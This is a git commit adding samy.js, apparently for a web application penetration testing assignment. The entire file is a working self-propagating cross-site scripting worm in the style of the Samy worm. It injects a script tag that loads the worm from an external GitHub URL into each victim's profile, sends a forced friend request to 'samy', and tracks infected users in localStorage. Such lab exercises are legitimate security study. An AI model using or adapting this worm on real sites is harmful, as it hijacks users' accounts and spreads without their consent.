aafd87c3009c219319f4b7b25e241e005a3f1a53
DasMeAyy <64674439+gjh0239@users.noreply.github.com>
2024-07-05 10:14:04 +0800

    Create samy.js
    Linked approach

---
+++ samy.js
@@ -0,0 +1,31 @@
+function updateProfile() {
+	payload = "\<script" + " src=\"https://github.com/gjh0239/WAPT-Assignment-1/blob/main/samy.js\"\>";
+
+	fetch("/profile/update", {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json",
+		},
+		body: JSON.stringify({ "content": payload+"Samy is the hero!"+"\<\/script\>"})
+	})
+}
+
+function addFriend() {
+	fetch("/friend", {
+		method: "POST",
+		headers: {
+			"Content-Type": "application/json",
+		},
+		body: JSON.stringify({ friend: "samy" })
+	})
+}
+
+const usernameTag = document.getElementById("username");
+if (usernameTag.textContent !== "samy" && !localStorage.getItem(usernameTag.textContent)){
+	const username = usernameTag.querySelector("strong").innerText.trim();
+	updateProfile();
+	addFriend();
+	
+	// prevent re-infection of victim
+	localStorage.setItem(usernameTag.textContent, true);
+}
